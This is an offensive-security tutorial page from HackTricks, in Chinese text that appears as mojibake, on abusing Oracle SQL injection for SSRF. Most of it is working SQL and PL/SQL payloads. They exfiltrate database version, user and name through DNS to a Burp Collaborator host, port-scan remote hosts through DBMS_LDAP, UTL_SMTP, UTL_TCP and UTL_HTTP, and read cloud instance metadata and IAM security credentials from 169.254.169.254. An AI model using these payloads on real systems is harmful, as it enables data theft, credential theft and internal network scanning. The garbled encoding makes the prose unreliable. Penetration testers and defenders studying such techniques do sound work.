# Oracleæ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## SSRF

ä½¿ç”¨Oracleè¿›è¡Œå¸¦å¤–HTTPå’ŒDNSè¯·æ±‚çš„æ–¹æ³•å·²ç»æœ‰å¾ˆå¥½çš„æ–‡æ¡£è®°å½•ï¼Œä½†è¿™æ˜¯ä½œä¸ºåœ¨æ³¨å…¥ä¸­æ³„éœ²SQLæ•°æ®çš„æ‰‹æ®µã€‚æˆ‘ä»¬æ€»æ˜¯å¯ä»¥ä¿®æ”¹è¿™äº›æŠ€æœ¯/å‡½æ•°æ¥æ‰§è¡Œå…¶ä»–SSRF/XSPAã€‚

å®‰è£…Oracleå¯èƒ½éå¸¸ç—›è‹¦ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ‚¨æƒ³å¿«é€Ÿè®¾ç½®ä¸€ä¸ªå®ä¾‹æ¥å°è¯•å‘½ä»¤ã€‚æˆ‘çš„æœ‹å‹å…¼åŒäº‹ï¼Œ[Appsecco](https://appsecco.com)çš„[Abhisek Datta](https://github.com/abhisek)ï¼Œå‘æˆ‘æ¨èäº†[https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c)ï¼Œè¿™ä½¿æˆ‘èƒ½å¤Ÿåœ¨t2.large AWS Ubuntuæœºå™¨å’ŒDockerä¸Šè®¾ç½®ä¸€ä¸ªå®ä¾‹ã€‚

æˆ‘è¿è¡Œäº†å¸¦æœ‰`--network="host"`æ ‡å¿—çš„dockerå‘½ä»¤ï¼Œè¿™æ ·æˆ‘å°±å¯ä»¥æ¨¡æ‹ŸOracleä½œä¸ºå…·æœ‰å®Œæ•´ç½‘ç»œè®¿é—®æƒé™çš„æœ¬åœ°å®‰è£…ï¼Œä¸ºäº†æœ¬åšå®¢æ–‡ç« çš„ç›®çš„ã€‚
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### æ”¯æŒURLæˆ–ä¸»æœºå/ç«¯å£å·è§„èŒƒçš„OracleåŒ… <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

ä¸ºäº†æ‰¾åˆ°æ”¯æŒä¸»æœºå’Œç«¯å£è§„èŒƒçš„ä»»ä½•åŒ…å’Œå‡½æ•°ï¼Œæˆ‘åœ¨[Oracleæ•°æ®åº“åœ¨çº¿æ–‡æ¡£](https://docs.oracle.com/database/121/index.html)ä¸Šè¿›è¡Œäº†è°·æ­Œæœç´¢ã€‚å…·ä½“æ¥è¯´ï¼Œ
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
æœç´¢è¿”å›ä»¥ä¸‹ç»“æœï¼ˆå¹¶éæ‰€æœ‰ç»“æœéƒ½å¯ç”¨äºæ‰§è¡Œå‡ºç«™ç½‘ç»œï¼‰

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

è¿™ç§ç²—ç•¥çš„æœç´¢æ˜¾ç„¶è·³è¿‡äº†åƒ `DBMS_LDAP` è¿™æ ·çš„åŒ…ï¼ˆå®ƒå…è®¸ä¼ é€’ä¸»æœºåå’Œç«¯å£å·ï¼‰ï¼Œå› ä¸º[æ–‡æ¡£é¡µé¢](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)åªæ˜¯å°†ä½ æŒ‡å‘[ä¸åŒä½ç½®](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360)ã€‚å› æ­¤ï¼Œå¯èƒ½è¿˜æœ‰å…¶ä»–æˆ‘å¯èƒ½é”™è¿‡çš„ Oracle åŒ…å¯ä»¥è¢«æ»¥ç”¨æ¥å‘èµ·å‡ºç«™è¯·æ±‚ã€‚

æ— è®ºå¦‚ä½•ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬å·²ç»å‘ç°å¹¶åˆ—å‡ºçš„ä¸€äº›åŒ…ã€‚

**DBMS\_LDAP.INIT**

`DBMS_LDAP` åŒ…å…è®¸ä» LDAP æœåŠ¡å™¨è®¿é—®æ•°æ®ã€‚`init()` å‡½æ•°ç”¨äºåˆå§‹åŒ–ä¸ LDAP æœåŠ¡å™¨çš„ä¼šè¯ï¼Œå¹¶æ¥å—ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ã€‚

æ­¤å‡½æ•°ä¹‹å‰å·²æœ‰æ–‡æ¡£è®°å½•ï¼Œç”¨äºå±•ç¤ºå¦‚ä½•é€šè¿‡ DNS æ³„éœ²æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤º
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
```markdown
ç„¶è€Œï¼Œè€ƒè™‘åˆ°è¯¥å‡½æ•°æ¥å—ä¸»æœºåå’Œç«¯å£å·ä½œä¸ºå‚æ•°ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒæ¥åƒç«¯å£æ‰«æå™¨ä¸€æ ·å·¥ä½œã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›ä¾‹å­
```
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` è¡¨æ˜ç«¯å£å…³é—­ï¼Œè€Œä¼šè¯å€¼æŒ‡å‘ç«¯å£å¼€æ”¾ã€‚

**UTL_SMTP**

`UTL_SMTP` åŒ…æ—¨åœ¨é€šè¿‡ SMTP å‘é€ç”µå­é‚®ä»¶ã€‚[Oracle æ–‡æ¡£ç½‘ç«™ä¸Šæä¾›çš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨æ­¤åŒ…å‘é€ç”µå­é‚®ä»¶](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478)ã€‚ç„¶è€Œï¼Œå¯¹æˆ‘ä»¬æ¥è¯´ï¼Œæœ‰è¶£çš„æ˜¯å®ƒèƒ½å¤Ÿæä¾›ä¸»æœºå’Œç«¯å£è§„èŒƒçš„èƒ½åŠ›ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ `UTL_SMTP.OPEN_CONNECTION` å‡½æ•°çš„ç®€å•ç¤ºä¾‹ï¼Œè¶…æ—¶è®¾ç½®ä¸º2ç§’ã€‚
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout` è¡¨ç¤ºç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œä½†æ²¡æœ‰å»ºç«‹ SMTP è¿æ¥ï¼Œè€Œ `ORA-29278: SMTP transient error: 421 Service not available` è¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚

**UTL\_TCP**

`UTL_TCP` åŒ…åŠå…¶ç¨‹åºå’Œå‡½æ•°å…è®¸[åŸºäº TCP/IP çš„ä¸æœåŠ¡çš„é€šä¿¡](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ã€‚å¦‚æœä¸ºç‰¹å®šæœåŠ¡ç¼–ç¨‹ï¼Œè¿™ä¸ªåŒ…å¯ä»¥è½»æ¾æˆä¸ºè¿›å…¥ç½‘ç»œçš„æ–¹å¼ï¼Œæˆ–æ‰§è¡Œå®Œæ•´çš„æœåŠ¡å™¨ç«¯è¯·æ±‚ï¼Œå› ä¸ºå¯ä»¥æ§åˆ¶ TCP/IP è¿æ¥çš„æ‰€æœ‰æ–¹é¢ã€‚

[Oracle æ–‡æ¡£ç«™ç‚¹ä¸Šçš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨è¿™ä¸ªåŒ…æ¥å»ºç«‹åŸå§‹ TCP è¿æ¥ä»¥è·å–ç½‘é¡µ](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ã€‚æˆ‘ä»¬å¯ä»¥ç®€åŒ–å®ƒï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å‘å…ƒæ•°æ®å®ä¾‹å‘å‡ºè¯·æ±‚ï¼Œä¾‹å¦‚ï¼Œæˆ–å‘ä»»æ„ TCP/IP æœåŠ¡å‘å‡ºè¯·æ±‚ã€‚
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
**UTL\_HTTP å’Œ Web è¯·æ±‚**

æˆ–è®¸åœ¨æ‰€æœ‰ Out of Band Oracle SQL æ³¨å…¥æ•™ç¨‹ä¸­æœ€å¸¸è§ä¸”å¹¿æ³›è®°å½•çš„æŠ€æœ¯æ˜¯ [`UTL_HTTP` åŒ…](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070)ã€‚æ–‡æ¡£å®šä¹‰è¿™ä¸ªåŒ…ä¸º - `UTL_HTTP åŒ…ä» SQL å’Œ PL/SQL å‘èµ·è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼ˆHTTPï¼‰è°ƒç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒé€šè¿‡ HTTP è®¿é—®äº’è”ç½‘ä¸Šçš„æ•°æ®ã€‚`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢æ‰§è¡Œä¸€äº›åŸºæœ¬çš„ç«¯å£æ‰«ææ“ä½œï¼Œä¾‹å¦‚
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` æˆ– `TNS:operation timed out` è¡¨ç¤º TCP ç«¯å£å…³é—­ï¼Œè€Œ `ORA-29263: HTTP protocol error` æˆ–æ•°æ®è¡¨ç¤ºç«¯å£å¼€æ”¾ã€‚

æˆ‘è¿‡å»ä½¿ç”¨è¿‡çš„å¦ä¸€ä¸ªåŒ…æ˜¯ [`HTTPURITYPE` Oracle æŠ½è±¡ç±»å‹çš„ `GETCLOB()` æ–¹æ³•](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705)ï¼Œå®ƒå…è®¸æ‚¨ä¸ URL äº¤äº’å¹¶æ”¯æŒ HTTP åè®®ã€‚`GETCLOB()` æ–¹æ³•ç”¨äºè·å– URL çš„ GET å“åº”ä½œä¸º [CLOB æ•°æ®ç±»å‹ã€‚](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
